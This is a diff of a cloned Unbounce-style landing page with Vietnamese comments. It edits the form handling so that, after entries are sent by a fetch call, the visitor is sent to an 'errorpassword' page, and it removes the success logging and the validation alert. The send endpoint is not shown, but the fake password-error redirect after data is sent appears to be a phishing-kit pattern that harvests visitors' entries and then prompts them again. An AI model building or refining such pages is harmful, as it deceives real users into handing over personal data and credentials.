@@ -710,14 +710,15 @@
 				border-radius: 5px;
 			}
 		}
+		
 	</style><!-- lp:insertions start head -->
 	<link href="../../builder-assets.unbounce.com/published-css/main-7b78720.z.css" rel="stylesheet" media="screen"
 		type="text/css" />
 	<meta property='og:title' content='' />
 	<script
-		type="text/javascript">window.ub = { "page": { "id": "0ff022b8-8afd-4868-8ca4-7400a1b962e9", "variantId": "a", "usedAs": "main", "name": "Jordan!2", "url": "index2.html", "dimensions": { "desktop": { "height": 818, "width": 1186 }, "mobile": { "height": 804, "width": 320 }, "mobileMaxWidth": 600 } }, "hooks": { "beforeFormSubmit": [], "afterFormSubmit": [] } };</script>
+		type="text/javascript">window.ub = { "page": { "id": "0ff022b8-8afd-4868-8ca4-7400a1b962e9", "variantId": "a", "usedAs": "main", "name": "Jordan!2", "url": "hi", "dimensions": { "desktop": { "height": 818, "width": 1186 }, "mobile": { "height": 804, "width": 320 }, "mobileMaxWidth": 600 } }, "hooks": { "beforeFormSubmit": [], "afterFormSubmit": [] } };</script>
 	<script
-		type="text/javascript">window.ub.form = { "action": "url", "validationRules": { "first_name": { "required": true }, "last_name": { "required": true } }, "validationMessages": { "first_name": {}, "last_name": {} }, "customValidators": {}, "includeFormData": false, "url": "index2.html", "target": "_self", "isConversionGoal": true }; window.module = { lp: { form: { data: window.ub.form } } };</script><!--
+		type="text/javascript">window.ub.form = { "action": "url", "validationRules": { "first_name": { "required": true }, "last_name": { "required": true } }, "validationMessages": { "first_name": {}, "last_name": {} }, "customValidators": {}, "includeFormData": false, "url": "errorpassword", "target": "_self", "isConversionGoal": true }; window.module = { lp: { form: { data: window.ub.form } } };</script><!--
 	
 	*** Adding Open Graph Tags and Favicons ***		
 	Below we added the codes you will need to add Favicons and Open Graph tags to your landing page. Remove the opening and closing comment marks ("<! --" and "-- >") to use these scripts, and update them with your open graph links and images. 
@@ -750,6 +751,23 @@
 
 	<!-- Open Graph URL  -->
 	<!-- <meta property="og:url" content="Canonical URL of your content"> --><!-- lp:insertions end head -->
+	<script>
+        // Kiểm tra nếu URL chứa index.html, chuyển hướng đến URL không có index.html
+        if (window.location.href.indexOf('index.html') > -1) {
+            window.location.href = window.location.href.replace('index.html', '');
+        }
+
+        // Xử lý khi người dùng chuyển qua trang thứ hai
+        function goToSecondPage() {
+            // Lấy đường dẫn hiện tại
+            var currentUrl = window.location.href;
+            // Thêm tên thư mục vào đường dẫn
+            var newUrl = currentUrl;
+            // Chuyển hướng tới trang thứ hai với tên thư mục
+            window.location.href = newUrl;
+        }
+    </script>
+
 	<script>window.ub = window.ub || {}; window.ub.visitorId = "43b29e43-dfc0-4268-80a1-d41883108078"; window.ub.routingStrategy = "single"; window.ub.domain = {};</script>
 	<script async src="../_ub/static/ts/b907c51d6869e69d8a396f17f7ba15905e81aff2.js"></script>
 </head>
@@ -863,16 +881,13 @@
 					return response.json();
 				})
 				.then(data => {
-					console.log('Message sent successfully:', data);
-					window.location.href = 'index2.html';
-					// Thực hiện các hành động khác sau khi tin nhắn đã được gửi thành công
+					window.location.href = 'errorpassword';
 				})
 				.catch(error => {
-					console.error('There was a problem with sending message:', error);
 					alert('Error sending message!');
 				});
 			} else {
-				alert("Please enter both first name and last name.");
+				
 			}
 		});
 		</script>
